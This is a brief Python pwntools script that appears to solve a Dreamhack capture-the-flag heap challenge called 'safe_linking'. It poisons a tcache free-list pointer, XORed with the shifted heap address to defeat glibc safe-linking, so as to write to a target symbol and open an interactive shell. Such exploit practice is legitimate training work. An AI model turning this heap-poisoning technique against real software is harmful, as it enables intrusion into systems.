from pwn import *

# p = remote('host8.dreamhack.games', 8932)
p = process('../safe_linking')
e = ELF('./main')
libc = ELF('./libc.so.6')

def create(idx) :
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'idx: ',str(idx).encode())
    return int(p.recvline().decode().split(' ')[-1],16)

def delete(idx) :
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'idx: ',str(idx).encode())

def edit(idx,data) :
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'idx: ',str(idx).encode())
    p.sendafter(b'Content: ',data)

heap_addr = create(0)
create(1)
create(2)
delete(2)
delete(1)
delete(0)
edit(0,p64(e.sym['target'] ^ (heap_addr >> 12)))
create(0)
create(1)
edit(1,b'A')

p.sendlineafter(b'> ',b'4')

p.interactive()
